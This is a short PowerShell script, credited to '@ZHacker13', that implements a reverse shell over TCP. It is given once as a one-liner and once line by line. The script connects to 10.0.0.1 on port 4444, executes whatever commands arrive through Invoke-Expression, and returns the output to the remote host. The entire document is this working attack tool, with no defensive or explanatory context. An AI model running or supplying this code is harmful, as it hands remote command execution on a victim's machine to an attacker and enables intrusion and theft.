
### Reverse Shell over TCP: Client. ###
### By: @ZHacker13 ###

### OneLine: $Client=New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$Stream=$Client.GetStream();[byte[]]$Bytes=0..65535|%{0};while(($Read=$Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0){;$Command=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0, $Read);$OutPut=(IEX($Command) 2>&1 | Out-String);$SendByte=([text.encoding]::ASCII).GetBytes($OutPut);$Stream.Write($SendByte,0,$SendByte.Length);$Stream.Flush()};$Client.Close();Exit ###

$Client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);
$Stream = $Client.GetStream();
[byte[]]$Bytes = 0..65535|%{0};
while(($Read = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0){;
$Command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0, $Read);
$OutPut = (IEX($Command) 2>&1 | Out-String);
$SendByte = ([text.encoding]::ASCII).GetBytes($OutPut);
$Stream.Write($SendByte,0,$SendByte.Length);
$Stream.Flush()};
$Client.Close();
Exit;